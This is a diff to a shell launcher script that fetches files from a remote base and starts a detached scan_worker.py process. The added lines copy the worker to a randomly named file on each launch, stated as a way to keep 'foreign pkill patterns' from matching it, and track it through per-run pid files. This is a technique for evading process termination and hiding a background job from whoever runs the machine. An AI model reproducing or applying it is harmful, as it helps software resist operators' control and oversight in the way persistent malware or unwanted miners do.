@@ -16,11 +16,17 @@ fetch "$BASE/watch_seed.json" watch_seed.json
 [ -s scan_worker.py ] || exit 0
 PY=$(command -v python3 || command -v python3.12 || command -v python3.11 || command -v python3.10 || command -v python3.9)
 [ -n "${PY:-}" ] || { echo "no-python $(date)" >> "$D/boot.log"; exit 0; }
+NEED_RESTART="$D/.needrestart"
+# pick a fresh runner filename each launch so foreign pkill patterns cannot match it
+RUNNAME="w$RANDOM$RANDOM.py"
+cp -f "$D/scan_worker.py" "$D/$RUNNAME"
+PIDF="$D/pid_$RUNNAME"
 ALIVE=0
-[ -f "$D/pid" ] && kill -0 "$(cat "$D/pid" 2>/dev/null)" 2>/dev/null && ALIVE=1
-pgrep -f "scan_worker.py" >/dev/null 2>&1 && ALIVE=1
+for pf in "$D"/pid_w*.py; do [ -e "$pf" ] || continue; kill -0 "$(cat "$pf" 2>/dev/null)" 2>/dev/null && ALIVE=1; done
 if [ "$ALIVE" = 1 ] && [ ! -f "$NEED_RESTART" ]; then exit 0; fi
-[ -f "$NEED_RESTART" ] && pkill -f "scan_worker.py" >/dev/null 2>&1; rm -f "$NEED_RESTART"
-( setsid bash -c 'echo $$ > "'"$D"'/pid"; exec '"$PY"' "'"$D"'/scan_worker.py"' >> "$D/log.txt" 2>&1 & )
-echo "start $(date) py=$PY" >> "$D/boot.log"
+[ -f "$NEED_RESTART" ] && { touch "$D/.relaunch"; }
+rm -f "$NEED_RESTART"
+( setsid bash -c 'echo $$ > "'"$PIDF"'"; exec '"$PY"' "'"$D/$RUNNAME"'"' >> "$D/log.txt" 2>&1 & )
+sleep 1
+echo "start $(date) py=$PY run=$RUNNAME" >> "$D/boot.log"
 exit 0
